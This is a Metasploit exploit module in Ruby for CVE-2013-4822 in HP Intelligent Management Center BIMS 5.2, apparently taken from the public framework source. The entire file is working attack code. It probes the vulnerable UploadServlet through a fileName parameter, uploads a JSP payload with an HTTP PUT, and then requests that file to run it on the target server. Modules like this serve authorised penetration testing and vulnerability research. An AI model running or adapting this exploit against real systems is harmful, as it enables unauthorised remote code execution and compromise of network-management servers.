##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HP Intelligent Management Center BIMS UploadServlet Directory Traversal',
      'Description' => %q{
          This module exploits a directory traversal vulnerability on the version 5.2 of the BIMS
        component from the HP Intelligent Management Center. The vulnerability exists in the
        UploadServlet, allowing the user to download and upload arbitrary files. This module has
        been tested successfully on HP Intelligent Management Center with BIMS 5.2 E0401 on Windows
        2003 SP2.
      },
      'Author'       =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-4822' ],
          [ 'OSVDB', '98247' ],
          [ 'BID', '62895' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-238/' ],
          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03943425' ]
        ],
      'Privileged'  => true,
      'Platform'    => 'win',
      'Arch'        => ARCH_JAVA,
      'Targets'     =>
        [
          [ 'HP Intelligent Management Center 5.1 E0202 - 5.2 E0401 / BIMS 5.1 E0201 - 5.2 E0401 / Windows', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 08 2013'))

    register_options(
      [
        Opt::RPORT(8080)
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri'    => normalize_uri("/", "upload", "upload"),
      'method' => 'GET',
      'vars_get' => { 'fileName' => "WEB-INF/web.xml" },
    })

    if res.nil?
      print_error("Unable to determine, because the request timed out.")
      return Exploit::CheckCode::Unknown
    end

    if res.code == 200 and res.headers['Content-Type'] =~ /application\/doc/ and res.body =~ /com\.h3c\.imc\.bims\.acs\.server\.UploadServlet/
      return Exploit::CheckCode::Vulnerable
    elsif res.code == 405 and res.message =~ /Method Not Allowed/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    # New lines are handled on the vuln app and payload is corrupted
    #jsp = payload.encoded.gsub(/\x0d\x0a/, "").gsub(/\x0a/, "")
    jsp_name = "#{rand_text_alphanumeric(4+rand(32-4))}.jsp"

    print_status("#{peer} - Uploading the JSP payload...")
    res = send_request_cgi({
      'uri'    => normalize_uri("/", "upload", "upload"),
      'method' => 'PUT',
      'vars_get' => { 'fileName' => jsp_name },
      'data' => payload.encoded
    })

    if  res and res.code == 200 and res.body.empty?
      print_status("#{peer} - JSP payload uploaded successfully")
      register_files_for_cleanup("..\\web\\apps\\upload\\#{jsp_name}")
    else
      fail_with(Failure::Unknown, "#{peer} - JSP payload upload failed")
    end

    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      'uri'    => normalize_uri("/", "upload", jsp_name),
      'method' => 'GET'
    }, 1)

  end

end
